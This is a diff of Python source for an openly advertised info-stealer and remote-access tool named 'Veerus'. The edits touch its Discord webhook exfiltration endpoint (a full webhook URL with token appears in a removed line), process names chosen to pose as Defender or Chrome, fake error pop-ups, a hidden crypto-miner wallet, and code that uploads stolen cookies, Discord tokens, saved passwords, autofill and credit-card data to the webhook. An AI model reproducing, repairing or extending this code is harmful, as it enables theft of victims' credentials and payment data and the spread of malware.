@@ -43,12 +43,12 @@ import pyImpossibleObf
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "https://discord.com/api/webhooks/1009692660677746689/gdpKIwWkfzJs6HQYV9RTsW_r7_ydwQmOLTyxaKxl0L9_rdfuDnreOS9gLLu01mZzpb_I"
+chiffre = "webhook667"
 ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
 CLONE_PROCESS = True # Create Instances of the program hidden in multiple path.
-PROCCESS_NAMES = ["defender", "sys", "gogle", "gchrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
+PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
 PROCESS_NUM = 3 #3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
 
 FAKERROR = True #Show fake critical error 
@@ -56,7 +56,7 @@ FAKERRMSG = "Exception at thread 0xSxZ3b78"
 MINE = True #Mine crypto? True/False
 
 DMALL_FRIENDS = False #Dm all friends in discord using token.
-DMALL_MSG = ":flag_gb: :\nFÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»cked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.
+DMALL_MSG = ":flag_gb: :\nFÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»cked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.
 
 
 APP_DATA_PATH= os.environ['LOCALAPPDATA']
@@ -143,7 +143,7 @@ if yes == "yes":
 		if(FAKERROR == True):
 			root = tk.Tk()
 			root.withdraw()
-			tk.messagebox.showwarning("Critical Error", FAKERRMSG) 
+			messagebox.showwarning("Critical Error", FAKERRMSG) 
 	threading.Thread(target=fakerrthread).start()
 	try:
 		url = 'http://ipinfo.io/json'
@@ -219,7 +219,7 @@ if yes == "yes":
 				if(ibm >= 370):
 					break
 			Founded = True
-			return str(res) + ":::667" + str(currency) + ":::667" + str(creditcard)
+			return str(res) + "welekip" ":::667" + str(currency) + ":::667" + str(creditcard)
 		except Exception as e:
 			print(e)
 
@@ -559,7 +559,8 @@ if yes == "yes":
 		webhook.add_file(file=str(CookiesLinux()), filename="0xCookies.txt") 
 		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
 		webhook.add_file(file=PasswWin().replace("{'", "\n\n").replace("},", ""), filename="0xPasswords.txt")
-		autfill = stealChromeWin().split(":::667")
+		autofill = stealChromeWin()
+		autfill = str(autofill).split(":::667")
 		print(autfill[1])
 		webhook.add_file(file=autfill[0], filename="Autofill.txt")
 		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============
